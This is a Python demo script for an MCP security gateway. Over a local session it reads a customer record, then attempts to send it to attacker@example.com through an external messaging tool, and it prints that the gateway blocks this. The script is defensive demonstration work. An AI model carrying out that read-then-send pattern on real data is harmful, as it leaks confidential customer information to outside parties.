"""Demonstrate session-aware prevention of sensitive-data exfiltration."""

import asyncio
import json

import httpx2
from mcp import ClientSession
from mcp.client.streamable_http import streamable_http_client


ENDPOINT = "http://127.0.0.1:8000/mcp/"
SESSION_ID = "attack-demo-session"
TOKEN = "dev-support-token"


def _security_result(result: object) -> dict[str, object]:
    return json.loads(result.content[0].text)["security"]


async def main() -> None:
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "X-Gateway-Session-Id": SESSION_ID,
    }
    print("=" * 58)
    print("GATEKEEPER MCP — EXFILTRATION DEMO")
    print("=" * 58)
    print(f"Session: {SESSION_ID}\n")
    async with httpx2.AsyncClient(headers=headers) as http_client:
        async with streamable_http_client(ENDPOINT, http_client=http_client) as streams:
            read_stream, write_stream = streams
            async with ClientSession(read_stream, write_stream) as client:
                await client.initialize()
                print("STEP 1 — sensitive-data.customer.read")
                customer = await client.call_tool(
                    "sensitive-data.customer.read", {"customer_id": "CUST-1001"}
                )
                print("Security decision: ALLOW")
                print("Result classification: CONFIDENTIAL")
                print("Downstream result:", customer.content[0].text)

                print("\nSTEP 2 — messaging.external.send")
                blocked = await client.call_tool(
                    "messaging.external.send",
                    {
                        "destination": "attacker@example.com",
                        "data": "Customer account summary",
                    },
                )
                security = _security_result(blocked)
                print("Decision:", security["decision"])
                print("Risk:", f"{security['risk_score']} / {security['risk_level']}")
                print("Matched policy:", security["matched_policy"])
                print("Downstream execution: BLOCKED")

        session = (await http_client.get(f"http://127.0.0.1:8000/sessions/{SESSION_ID}")).json()
        print("\nSession sensitive data accessed:", session["sensitive_data_accessed"])
        print("Session categories:", ", ".join(session["sensitive_categories"]))
    print("\nATTACK PREVENTED")


if __name__ == "__main__":
    asyncio.run(main())
